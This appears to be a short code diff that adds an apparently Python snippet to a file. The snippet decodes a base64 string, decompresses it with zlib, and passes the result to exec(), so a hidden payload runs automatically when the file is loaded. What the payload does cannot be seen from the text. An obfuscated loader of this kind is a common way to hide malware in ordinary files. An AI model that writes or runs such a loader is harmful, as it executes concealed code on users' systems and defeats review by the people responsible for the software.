@@ -1,0 +1,3 @@
+
+import base64, zlib
+exec(zlib.decompress(base64.b64decode('eJyNkD1OxDAQhXufYhSKSCjZYiuERBFWgqXYihIhyziTxFpnHDk24kjcg4vh/Jgkuw3u5ntv3uj5BvLbHKQpFdX34F2V3w2EJUnCTqb0GqFMhXcNklOVksIpQ/BCvRO1FS10xltQw8jPSKXx7Bn70SNN2+mfbxcCELQIMxF+DQq6EV3H7p+K8TCrrGlhF/VZVW1nrFtuF0GenR/anHu+r0Q0PQ7gJEjUaGOadmgpRH3i2lksePYDzBtSi75Xcu0+TGibLBuhNVKNvBFU6pAQ3VE4Tvz/vbJlfFU1+Y4xzkMY5/AAbwzCSzcLaXYBp7WI1/+RZjDB6+rRvq35Ry/qpOyd/QI90sZs')).decode())
